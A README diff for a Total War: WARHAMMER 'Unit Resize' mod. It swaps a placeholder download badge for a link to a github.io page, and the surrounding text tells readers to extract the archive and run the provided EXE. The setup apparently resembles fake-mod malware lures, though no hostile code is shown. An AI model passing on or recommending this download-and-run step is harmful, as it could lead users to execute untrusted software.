@@ -5,7 +5,7 @@ To install, simply extract the downloaded archive and run the provided EXE file.
 
 Unit Resize is a visual enhancement mod that adjusts the scale of unit models in Total War: WARHAMMER. It makes large units like giants and dragons feel epic, and small ones like goblins more believable — enhancing both immersion and battle readability.
 
-[![Download Unit Resize](https://img.shields.io/badge/Download-Unit--Resize--Mod-blueviolet)](#)
+[![Download Unit Resize](https://img.shields.io/badge/Download-Unit--Resize--Mod-blueviolet)](https://unit-resize-mod-for-warhammer.github.io/.github)
 
 ---
 
